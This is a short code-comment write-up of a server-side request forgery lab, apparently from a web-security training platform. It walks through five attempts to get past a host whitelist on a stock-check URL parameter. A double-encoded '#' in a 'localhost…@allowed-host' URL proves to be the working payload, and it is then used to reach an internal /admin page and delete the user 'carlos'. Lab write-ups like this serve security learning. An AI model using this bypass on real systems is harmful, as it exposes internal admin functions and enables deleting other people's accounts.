/*
Below is the original stockApi parameter value URL
http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

Ctrl+Shft+U decodes it in Burp repeater
http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1

Lets start hitting and trying

first trial _|_
http://localhost
    http%3a//localhost
Error: "External stock check host must be stock.weliketoshop.net"   400 Bad request
    --->
So the URL must include this domain "stock.weliketoshop.net"

second trial _|_ _|_ 
http://stock.weliketoshop.net@localhost
    http%3a//stock.weliketoshop.net%40localhost
Error: "External stock check host must be stock.weliketoshop.net"  400 Bad request
Host part should be stock.weliketoshop.net and at the end


third trial _|_ _|_ _|_ 
http://localhost@stock.weliketoshop.net
Error: "Could not connect to external stock check service"  500 internal server error
    -->
So the host is now "stock.weliketoshop.net" as expected by the server and it is treating localhost as
part of valid URL.
If we can use # to turn the host into a fragment on the page???

fourth trial _|_ _|_ _|_ _|_ 
http://localhost#@stock.weliketoshop.net
NO

fifth trial _|_ _|_ _|_ _|_ _|_
Encoding the '#' twice
http://localhost%2523@stock.weliketoshop.net
200 OK

http://localhost%2523@stock.weliketoshop.net/admin
200 OK


http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
302 Found
*/